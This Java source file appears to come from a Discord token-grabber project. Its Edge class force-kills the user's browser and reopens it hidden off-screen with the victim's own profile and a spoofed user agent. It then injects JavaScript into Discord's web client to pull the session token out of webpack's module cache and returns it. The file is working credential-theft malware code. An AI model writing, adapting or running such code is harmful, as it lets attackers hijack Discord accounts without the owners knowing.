package com.github.dedinc.discordtokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;
import java.util.Arrays;

import org.openqa.selenium.Dimension;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Point;

import com.github.dedinc.discordtokengrabber.Main;
import com.github.dedinc.discordtokengrabber.utils.Helper;
import com.microsoft.edge.seleniumtools.EdgeDriver;
import com.microsoft.edge.seleniumtools.EdgeOptions;

public class Edge {
	public String grab() {
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "msedgedriver.exe").toString()).exists()) {
			Helper.getWebDriver().getEdgeDriver();
		}
		String edge = Paths.get(Main.cd, "Users", Main.username, "AppData", "Local", "Microsoft", "Edge").toString();
		System.setProperty("webdriver.edge.driver", Paths.get(Main.cd, "Users", Main.username, "msedgedriver.exe").toString());
		EdgeOptions options = new EdgeOptions();		
		options.addArguments("user-data-dir=" + Paths.get(edge, "User Data").toString());
		options.addArguments("user-agent=" + Helper.getUserAgents().getAgent());
		options.addArguments("--window-size=0,0");
		options.setExperimentalOption("excludeSwitches", Arrays.asList("enable-automation"));
		options.setExperimentalOption("useAutomationExtension", false);
		try {
			Runtime.getRuntime().exec("taskkill /im msedge.exe /f");
		  } catch (Exception e) {
		}
		EdgeDriver driver = new EdgeDriver(options);
		driver.manage().window().setPosition(new Point(99999, 99999));
		driver.manage().window().setSize(new Dimension(0, 0));
		driver.get("https://discord.com/channels/@me");
		JavascriptExecutor js = (JavascriptExecutor) driver;
		String token = (String) js.executeScript("return Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()");
		driver.quit();
		return token;
	}
}
